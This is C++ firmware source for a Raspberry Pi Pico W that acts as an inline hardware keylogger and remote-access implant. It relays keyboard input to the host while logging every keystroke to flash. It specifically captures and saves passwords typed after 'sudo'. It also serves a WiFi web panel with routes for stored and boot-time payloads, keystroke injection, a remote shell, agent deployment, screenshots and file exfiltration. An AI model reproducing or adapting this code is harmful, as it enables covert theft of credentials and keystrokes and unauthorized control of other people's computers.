#include <LittleFS.h> 
#include "pio_usb.h"
#include "Adafruit_TinyUSB.h"
#include <WiFi.h>
#include <WebServer.h>
#include <functional>
#include "PicoKeyboard.h"
#include "base64.h"
#include "setup.h"
#include "webfunctions.h"
#include "webfiles.h"
#include "hardware/watchdog.h"
#include "pico/stdlib.h"


// ============================================================ Buffer Functions =================================================================

void restartPico() {
  watchdog_enable(1, 1);
  while (true) {}
}

void setLayout() {
    File file = LittleFS.open("/config.txt", "r");
    if (!file) {
        Serial.println("No config.txt found. Using default layout (us).");
        Keyboard.setLayout(us_layout);
        return;
    }

    String savedLayout = "us";
    while (file.available()) {
        String line = file.readStringUntil('\n');
        line.trim();
        if (line.startsWith("Layout:")) {
            savedLayout = line.substring(7);
            savedLayout.trim();
        }
    }
    file.close();

    if      (savedLayout == "us")    Keyboard.setLayout(us_layout);
    else if (savedLayout == "uk")    Keyboard.setLayout(uk_layout);
    else if (savedLayout == "de")    Keyboard.setLayout(de_layout);
    else if (savedLayout == "fr")    Keyboard.setLayout(fr_layout);
    else if (savedLayout == "fi")    Keyboard.setLayout(fi_layout);
    else if (savedLayout == "be")    Keyboard.setLayout(be_layout);
    else if (savedLayout == "es")    Keyboard.setLayout(es_layout);
    else if (savedLayout == "dk")    Keyboard.setLayout(dk_layout);
    else if (savedLayout == "it")    Keyboard.setLayout(it_layout);
    else if (savedLayout == "tr")    Keyboard.setLayout(tr_layout);
    else if (savedLayout == "pt")    Keyboard.setLayout(pt_layout);
    else if (savedLayout == "br")    Keyboard.setLayout(br_layout);
    else if (savedLayout == "be")    Keyboard.setLayout(be_layout);
    else {
        Serial.println("Unknown layout in config.txt, defaulting to us.");
        Keyboard.setLayout(us_layout);
    }

    Serial.println("Keyboard layout set to: " + savedLayout);
}

void openLogFile() {
    File f = LittleFS.open("/keys.txt", "a");
    if (!f) {
        Serial.println("Error opening log file");
    }
}

void writeBufferedKey(char key) {

    char str[2] = { key, '\0' };
    
    if (!commandDetected && bufferIndex >= 5) { 
        String lastFive = String(keyBuffer[bufferIndex - 4]) + 
                          String(keyBuffer[bufferIndex - 3]) + 
                          String(keyBuffer[bufferIndex - 2]) + 
                          String(keyBuffer[bufferIndex - 1]) + 
                          String(key);        
        if (lastFive == "sudo ") {
            commandDetected = true;
            sudoPassword = "";
        }
    }
    if (commandDetected && key == '\n') {
        passwordExpected = true;
        commandDetected = false;
        sudoPassword = "";
        return;
    }
    if (passwordExpected && passwordWaiting) {
        if (key == '\n') {
            passwordExpected = false;
            if (sudoPassword.length() > 0) {
                File sudoFile = LittleFS.open("/sudo.txt", "w");
                if (sudoFile) {
                    sudoFile.println(sudoPassword);
                    sudoFile.close();
                    passwordWaiting = false;
                } else {
                    Serial.println("Error saving password.");
                }
                sudoPassword = "";
            }
            return;
        } else if (key != '\r') {
            sudoPassword += key;
        }
    }
    if (bufferIndex < BUFFER_SIZE - 1) {
        keyBuffer[bufferIndex++] = key;
        lastKeyTime = millis();
    } else {
        flushBuffer();
    }
}

void flushBuffer() {
  File f = LittleFS.open("/keys.txt", "a");
    if (bufferIndex > 0 && f) {
        f.write((const uint8_t*)keyBuffer, bufferIndex);
        f.flush();
        bufferIndex = 0;
    }
}

void closeLogFile() {
    flushBuffer();
    File f = LittleFS.open("/keys.txt", "a");
    if (f) {
        f.close();
    }
}

void checkInactivity() {
    if (bufferIndex > 0 && (millis() - lastKeyTime > INACTIVITY_TIMEOUT_MS)) {
        flushBuffer();
    }
}

// ============================================================== Serial Functions =================================================================

void readLog() {
    File i = LittleFS.open("keys.txt", "r");
    delay(200);
    Serial.println("-------- LOGS ----------");
    if (i) {
      while (i.available()) {
        Serial.write(i.read());
      }
      i.close();
    }
    Serial.println("\n------------------------");
    Serial.println("\n");
}

void clearLog() {
    File i = LittleFS.open("keys.txt", "w");
    delay(2000);
    if (i) {
      i.write("");
      Serial.println("Log File Deleted: DONE");
      i.close();
    }
}

void formatFS() {
    delay(2000);
    LittleFS.format();
    Serial.println("Formatted FS : DONE");
}

// =========================================================== Main Setup and Loop =====================================================================
void setup() {
    Serial.begin(115200);
    LittleFS.begin();

    checkBootPayloads();
    loadWiFiSettings();
    delay(1000);
    bool wifiEnabled = loadWiFiState();
    if (wifiEnabled) {
        WiFi.softAP(ssid.c_str(), password.c_str());
        Serial.print("WiFi AP Started. Connect to: \n\tWiFi Name: " + String(ssid) + "\n\tPassword: " + String(password) + "\n\tWeb Interface: http://");// http://" + String(apip));
        Serial.print(WiFi.softAPIP());
        Serial.print("\n");
    } else {
        Serial.println("WiFi is disabled. Use 'wifion' to enable.");
    }
    
    LittleFS.mkdir("/payloads");
    
    server.on("/payloads", HTTP_GET, handlePayloadsPage);
    server.on("/list_payloads", HTTP_GET, listPayloads);
    server.on("/save_payload", HTTP_POST, savePayload);
    server.on("/delete_payload", HTTP_POST, deletePayload);
    server.on("/get-payload", HTTP_GET, handleGetPayload);
    server.on("/run_payload", HTTP_POST, runPayload);
    server.on("/", HTTP_GET, handleRoot);  
    server.on("/clear", HTTP_POST, handleClearLogs);
    server.on("/toggle_payload_boot", HTTP_POST, handleTogglePayloadOnBoot);
    server.on("/list_boot_payloads", HTTP_GET, handleListBootPayloads);
    server.on("/settings", HTTP_GET, handleSettingsPage);
    server.on("/save_settings", HTTP_POST, handleSaveSettings);
    server.on("/load_settings", HTTP_GET, handleLoadSettings);
    server.on("/format_littlefs", HTTP_POST, handleFormatLittleFS);
    server.on("/keyboard", HTTP_GET, handleKeyboardPage);
    server.on("/keypress", HTTP_POST, handleKeyPress);
    server.on("/shell", HTTP_GET, handleShell);
    server.on("/execute", HTTP_POST, handleExecuteCommand);
    server.on("/deploy", HTTP_POST, handlePsAgent);
    server.on("/screen", HTTP_GET, handleScreenPage);
    server.on("/take-screenshot", HTTP_POST, handleTakeScreenshot);
    server.on("/get-screenshot", HTTP_GET, handleGetScreenshot);
    server.on("/deploy-screenshot", HTTP_POST, handleSSAgent);
    server.on("/screenshot.jpg", HTTP_GET, handleSavedScreenshot);
    server.on("/exit-agent", HTTP_POST, handleExitAgent);
    server.on("/reboot_pico", HTTP_POST, restartPico);
    server.on("/update_password", HTTP_POST, handleUpdatePassword);
    server.on("/get_password", HTTP_GET, handleGetPassword);
    server.on("/explorer", HTTP_GET, handleFileExplorer);
    server.on("/download", HTTP_GET, handleDownload);
    server.on("/edit", HTTP_GET, handleEdit);
    server.on("/save", HTTP_POST, handleSave);
    server.on("/delete", HTTP_GET, handleDelete);
    server.on("/deploy_linux", HTTP_GET, handleLinuxAgent);
    server.on("/exfiltrate", HTTP_GET, handleShellExplorer);
    server.on("/deploy_explorer", HTTP_POST, handleDeployFileAgent);
    server.on("/list_files", HTTP_GET, handleListFiles);
    server.on("/download_file", HTTP_GET, handleDownloadFile);
    server.on("/exit_agent", HTTP_POST, handleExitAgent);

    server.begin();
    Serial.println("HTTP Server Started.");
}

void loop() { 
    if (Serial.available()) {
        String command = Serial.readStringUntil('\n');
        command.trim();       
        if (command.startsWith("ssid ")) {
            changeSSID(command.substring(5));
        } else if (command.startsWith("password ")) {
            changePassword(command.substring(9));
        } else if (command == "read") {
            readLog();
        } else if (command == "clear") {
            clearLog();
        } else if (command == "format") {
            formatFS();
        } else if (command == "wifion") {
            WiFi.softAP(ssid.c_str(), password.c_str());
            Serial.println("WiFi enabled.");
            saveWiFiState(true);
        } else if (command == "wifioff") {
            WiFi.softAPdisconnect(true);
            Serial.println("WiFi disabled.");
            saveWiFiState(false);
        }
    }   
    server.handleClient();
    checkInactivity();
    readSerialScreenshot();
}

void setup1() { 
    uint32_t cpu_hz = clock_get_hz(clk_sys);
    if ( cpu_hz != 120000000UL && cpu_hz != 240000000UL ) {
      Serial.printf("Error: CPU Clock = %u, PIO USB require CPU clock must be multiple of 120 Mhz\r\n", cpu_hz);
      Serial.printf("Change your CPU Clock to either 120 or 240 Mhz in Menu->CPU Speed \r\n", cpu_hz);
    }
    pio_usb_configuration_t pio_cfg = PIO_USB_DEFAULT_CONFIG;
    pio_cfg.pin_dp = HOST_PIN_DP;
    USBHost.configure_pio_usb(1, &pio_cfg);
    USBHost.begin(1);

    Keyboard.begin();
    Mouse.begin(); 
    delay(4000);   
    Keyboard.end();
    Mouse.end();
    delay(50);
    Keyboard.begin();
    Mouse.begin();
    setLayout();
}

void loop1() {
    USBHost.task();
}

// =========================================================== Setup Host Keyboard ===================================================================
void tuh_hid_mount_cb(uint8_t dev_addr, uint8_t idx, uint8_t const* desc_report, uint16_t desc_len) {
    if ( !tuh_hid_receive_report(dev_addr, idx) ) {
      Serial.printf("Error: cannot request to receive report\r\n");
    }  
}

void tuh_hid_report_received_cb(uint8_t dev_addr, uint8_t idx, uint8_t const* report, uint16_t len) {
    static bool reportPending = false; 
    if (!reportPending) {
        uint8_t const itf_protocol = tuh_hid_interface_protocol(dev_addr, idx);
        if (itf_protocol == HID_ITF_PROTOCOL_KEYBOARD) {
            process_boot_kbd_report((hid_keyboard_report_t const*)report);
        }
        if (itf_protocol == HID_ITF_PROTOCOL_MOUSE) {
            process_boot_mouse_report( (hid_mouse_report_t const*) report );
        }      
        reportPending = true;
        tuh_hid_receive_report(dev_addr, idx);
        reportPending = false;
    }
}

void process_boot_mouse_report(hid_mouse_report_t const * report) { 
  hid_mouse_report_t prev_report = { 0 };
  uint8_t button_changed_mask = report->buttons ^ prev_report.buttons;
  if ( button_changed_mask & report->buttons) {
    if(report->buttons & MOUSE_BUTTON_LEFT) {
      Mouse.press(MOUSE_LEFT);
      delay(100);
      Mouse.release(MOUSE_ALL);
    }
    else if(report->buttons & MOUSE_BUTTON_RIGHT) {
      Mouse.press(MOUSE_RIGHT); 
      delay(100);
      Mouse.release(MOUSE_ALL);
    }
    else if(report->buttons & MOUSE_BUTTON_MIDDLE) {
      Mouse.press(MOUSE_MIDDLE);
      delay(100);
      Mouse.release(MOUSE_ALL);
    }
  } 
  int8_t x; int8_t y; int8_t wheel;
  Mouse.move(report->x, report->y, report->wheel);
}

void SetModifiersArd(void) {
  modifiersard=0;
  if(mod == 2) modifiersard = SHIFT;
  if(mod == 64) modifiersard = ALTGR;
};

void ProcessKeys(void) {
  if (key == KEY_RETURN) {
    Keyboard.write('\n');
  }
  else if (key == 82) {
    Keyboard.press(KEY_UP_ARROW); delay(100);Keyboard.releaseAll();
  }
  else if (key == 81) {
    Keyboard.press(KEY_DOWN_ARROW); delay(100);Keyboard.releaseAll();
  }
  else if (key == 80) {
    Keyboard.press(KEY_LEFT_ARROW); delay(100);Keyboard.releaseAll();
  }
  else if (key == 79) {
    Keyboard.press(KEY_RIGHT_ARROW); delay(100);Keyboard.releaseAll();
  }
  else if (key == 41) {
    Keyboard.press(KEY_ESC); delay(100);Keyboard.releaseAll();
  }
  else if (key == 73) {
    Keyboard.press(KEY_INSERT); delay(100);Keyboard.releaseAll();
  }
  else if (key == 77) {
    Keyboard.press(KEY_END); delay(100);Keyboard.releaseAll();
  }
  else if (key == 57) {
    Keyboard.press(KEY_CAPS_LOCK); delay(100);Keyboard.releaseAll();
  }
  else if (key == 70) {
    Keyboard.press(KEY_PRINT_SCREEN); delay(100);Keyboard.releaseAll();
  }
  else if (key == 58) {
    Keyboard.press(KEY_F1); delay(100);Keyboard.releaseAll();
  }
  else if (key == 59) {
    Keyboard.press(KEY_F2); delay(100);Keyboard.releaseAll();
  }
  else if (key == 60) {
    Keyboard.press(KEY_F3); delay(100);Keyboard.releaseAll();
  }
  else if (key == 61) {
    Keyboard.press(KEY_F4); delay(100);Keyboard.releaseAll();
  }
  else if (key == 62) {
    Keyboard.press(KEY_F5); delay(100);Keyboard.releaseAll();
  }
  else if (key == 63) {
    Keyboard.press(KEY_F6); delay(100);Keyboard.releaseAll();
  }
  else if (key == 64) {
    Keyboard.press(KEY_F7); delay(100);Keyboard.releaseAll();
  }
  else if (key == 65) {
    Keyboard.press(KEY_F8); delay(100);Keyboard.releaseAll();
  }
  else if (key == 66) {
    Keyboard.press(KEY_F9); delay(100);Keyboard.releaseAll();
  }
  else if (key == 67) {
    Keyboard.press(KEY_F10); delay(100);Keyboard.releaseAll();
  }
  else if (key == 68) {
    Keyboard.press(KEY_F11); delay(100);Keyboard.releaseAll();
  }
  else if (key == 69) {
    Keyboard.press(KEY_F12); delay(100);Keyboard.releaseAll();
  }
  else if (key == 43) {
    Keyboard.press(KEY_TAB); delay(100);Keyboard.releaseAll();
  }
  else if (key == 42) {
    Keyboard.press(KEY_BACKSPACE); delay(100);Keyboard.releaseAll();
  }
}


// ====================================================== Process Keystrokes ==============================================================

void process_boot_kbd_report(hid_keyboard_report_t const *report) {
    static hid_keyboard_report_t prev_report = { 0, 0, {0} };
    static bool prev_modifier_state = false;
    static bool modifier_changed = false;
    static uint8_t last_pressed_keys[6] = {0};
    if(report->modifier) {
      for(uint8_t i=0; i<6; i++) {
        key = report->keycode[i];
      }
      mod = report->modifier;
      if(key == 0 && mod == 8) {
        Keyboard.press(KEY_LEFT_GUI);
      }
    }
    
    bool current_modifier_state = (report->modifier != 0);
    if (current_modifier_state != prev_modifier_state) {
        if (current_modifier_state) {
            mod = report->modifier;
            modifier_changed = true;
        } else {
            delay(100);
            Keyboard.releaseAll();
            modifier_changed = true;
            mod = 0;
        }
        prev_modifier_state = current_modifier_state;
    }
    
    for (uint8_t i = 0; i < 6; i++) {
        uint8_t key = report->keycode[i];
        if (key) {
            bool already_pressed = false;
            for (uint8_t j = 0; j < 6; j++) {
                if (last_pressed_keys[j] == key) {
                    already_pressed = true;
                    break;
                }
            }           
            if (!already_pressed) {
                SetModifiersArd();
                key_modifier_layout = key | modifiersard;
                
                for (int i = 0; i < 128; i++) {
                    uint8_t mappedValue = pgm_read_byte(_layoutMap + i);
                    
                    if (mappedValue == key_modifier_layout) {
                        char loggedChar = (char)i;
                        bool shiftActive = (mod & MODIFIERKEY_LEFT_SHIFT) || (mod & MODIFIERKEY_RIGHT_SHIFT);
                
                        if (shiftActive && loggedChar >= 'a' && loggedChar <= 'z') {
                            loggedChar = loggedChar - 'a' + 'A';
                        }
                        if (shiftActive) {
                            switch (loggedChar) {
                                case '1': loggedChar = '!'; break;
                                case '2': loggedChar = '@'; break;
                                case '3': loggedChar = '#'; break;
                                case '4': loggedChar = '$'; break;
                                case '5': loggedChar = '%'; break;
                                case '6': loggedChar = '^'; break;
                                case '7': loggedChar = '&'; break;
                                case '8': loggedChar = '*'; break;
                                case '9': loggedChar = '('; break;
                                case '0': loggedChar = ')'; break;
                                case '-': loggedChar = '_'; break;
                                case '=': loggedChar = '+'; break;
                                case '[': loggedChar = '{'; break;
                                case ']': loggedChar = '}'; break;
                                case '\\': loggedChar = '|'; break;
                                case ';': loggedChar = ':'; break;
                                case '\'': loggedChar = '\"'; break;
                                case ',': loggedChar = '<'; break;
                                case '.': loggedChar = '>'; break;
                                case '/': loggedChar = '?'; break;
                            }
                        }
                        writeBufferedKey(loggedChar);
                    }
                } 
                Keyboard.rawpress(key, mod);
            }
        }
    }   
    for (uint8_t i = 0; i < 6; i++) {
        bool still_pressed = false;
        for (uint8_t j = 0; j < 6; j++) {
            if (report->keycode[j] == last_pressed_keys[i]) {
                still_pressed = true;
                break;
            }
        }       
        if (!still_pressed && last_pressed_keys[i]) {
            Keyboard.rawrelease(last_pressed_keys[i], mod);
        }
    }   
    memcpy(last_pressed_keys, report->keycode, 6);
}
